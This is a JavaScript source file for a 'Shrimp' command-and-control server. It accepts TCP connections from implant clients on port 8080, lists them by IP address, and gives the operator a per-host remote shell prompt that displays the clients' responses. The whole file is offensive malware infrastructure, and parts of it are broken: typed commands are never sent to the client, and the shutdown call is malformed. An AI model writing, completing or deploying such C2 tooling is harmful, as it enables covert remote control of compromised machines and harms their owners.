const net = require('net');
const readline = require('readline');

class TextBuffer {
  constructor(text) {
    this.content = text;
  }

  get() {
    return this.content;
  }

  add(text) {
    this.content += `\n${text}`
  }

  flush() {
    this.content = '';
  }
}



let clients = {};
let currentId;
const textBuffer = new TextBuffer('');

const server = net.createServer((socket) => {
 const id = Math.random().toString(36).substring(7);
 clients[id] = {socketObject: socket, hostname: socket.remoteAddress};

socket.on('data', (data) => {
  const parsedData = JSON.parse(data);
  textBuffer.add(parsedData)
  if (parsedData['type'] == 'response') {
    textBuffer.add(parsedData['data']);
  }
});

 socket.on('end', () => {
 delete clients[id];
 textBuffer.add(`Client ${id} disconnected`);
 });
});

server.listen(8080, () =>
	{
});

function exit() {
  process.kill("Shutting down shrimp server.");
}

function promptUser(question) {
 return new Promise((resolve) => {
   const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout
   });

   rl.question(question, (answer) => {
     rl.close();
     resolve(answer);
   });
 });
}

async function main() {
 while (true) {
   console.log("Command and Control server for Shrimp started.");
   let input = await promptUser("shrimp! >>");
   switch (input.split(" ")[0]) {
     case "set":
       const id = input.split(" ")[1];
       currentId = id;
       while (true){
         const promptForId = await promptUser(clients[currentId].hostname+'$');
         
         // Create a promise that resolves after 10 seconds
         const timeoutPromise = new Promise(resolve => setTimeout(resolve, 10000));

         // Create a promise that resolves when the output arrives
         const outputPromise = new Promise(resolve => {
           const intervalId = setInterval(() => {
             if (textBuffer.get() != "") {
               clearInterval(intervalId);
               resolve();
             }
           }, 100);
         });

         // Wait for either the timeout or the output to arrive
         await Promise.race([timeoutPromise, outputPromise]);

         // If the output arrived, print it
         if (textBuffer.get() != "") {
           console.log(textBuffer.get());
         }
       }
       
       break;

     case "list":
       console.log(clients);
       break;

     case null:
       exit();
       break;
   }
 }
}

main();

